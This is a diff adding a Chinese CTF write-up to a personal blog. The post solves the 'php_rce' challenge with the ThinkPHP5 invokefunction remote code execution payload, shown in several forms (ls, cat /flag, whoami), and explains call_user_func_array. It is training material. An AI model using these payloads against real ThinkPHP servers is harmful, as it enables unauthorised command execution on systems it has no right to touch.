@@ -69,6 +69,66 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-web2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/18/web2/" class="article-date">
+  <time class="dt-published" datetime="2025-01-18T05:15:41.000Z" itemprop="datePublished">2025-01-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/18/web2/">web2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>Thinkphp5</strong></p>
+<p>&#x3D;&#x3D;攻防世界php_rce&#x3D;&#x3D;:</p>
+<p>进入题目环境，页面如下：</p>
+<p><img src="/$%7Bfiilename%7D/QQ20250117-200433.png"></p>
+<p>可能存在ThinkPHP5版本框架的漏洞。构造payload: <code>s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]=ls /</code></p>
+<p><img src="/$%7Bfiilename%7D/QQ20250118-135127.png"></p>
+<p>在根目录下看到flag,构造payload进入flag目录，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/$%7Bfiilename%7D/QQ20250118-140114.png"></p>
+<p>用cat命令查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/$%7Bfiilename%7D/QQ20250118-140431.png"></p>
+<p>&#x3D;&#x3D;总结&#x3D;&#x3D;：1.构造过程中用到的call_user_func_array()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(参数一，参数二)：</span><br><span class="line">参数一：表示一个回调函数。</span><br><span class="line">参数二：表示传递给这个回调函数的参数，参数二的数据类型为数组。</span><br><span class="line">如果回调函数成功执行，则返回执行结果，否则返回False值.</span><br></pre></td></tr></table></figure>
+
+<p>2.ThinkPHP5 invokeFunction漏洞:</p>
+<p>漏洞payload      <code>s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></p>
+<p>s参数是thinkphp的一种路由形式,这里传入的函数是call_user_func_array<br>参数是[system,[whoami]],call_user_func_array第一个参数是函数名，第二个参数也是数组.</p>
+<p>&#x3D;&#x3D;参考&#x3D;&#x3D;：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/303908.html">https://www.freebuf.com/vuls/303908.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://qin456486.github.io/2025/01/18/web2/" data-id="cm61szo2u0000e4v33jzf6r1e" data-title="web2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/17/web1/" class="article-date">
@@ -282,6 +342,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/01/18/web2/">web2</a>
+          </li>
         
           <li>
             <a href="/2025/01/17/web1/">web1</a>
